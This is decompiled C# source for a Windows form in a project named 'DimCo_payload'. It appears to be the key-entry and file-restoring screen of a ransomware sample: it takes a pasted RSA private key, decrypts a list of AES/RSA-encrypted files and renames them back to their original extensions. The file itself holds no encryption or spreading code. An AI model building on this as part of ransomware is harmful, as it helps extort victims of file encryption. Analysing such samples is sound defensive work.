using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using DimCo_payload.Encryption;
using Newtonsoft.Json;

namespace DimCo_payload;

public class Form1 : Form
{
	private IContainer components;

	private RichTextBox richTextBox1;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private static void setup(string xml)
	{
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		foreach (string item in global.encrypted)
		{
			try
			{
				if (global.Keys.PrivateKey == null)
				{
					break;
				}
				Console.WriteLine("decrypting " + item);
				Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(item));
				File.WriteAllBytes(item, DimCo_payload.Encryption.Encryption.Decrypt_File_AESRSA(encoded, xml));
				File.Move(item, Path.ChangeExtension(item, null));
			}
			catch
			{
				MessageBox.Show("Incorrect key. Try again.");
				break;
			}
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		setup(((Control)richTextBox1).get_Text());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		richTextBox1 = new RichTextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)richTextBox1).set_Location(new Point(0, 0));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(378, 238));
		((Control)richTextBox1).set_TabIndex(0);
		((Control)richTextBox1).set_Text("");
		((Control)button1).set_Location(new Point(303, 235));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Apply");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(377, 257));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Control)this).ResumeLayout(false);
	}
}
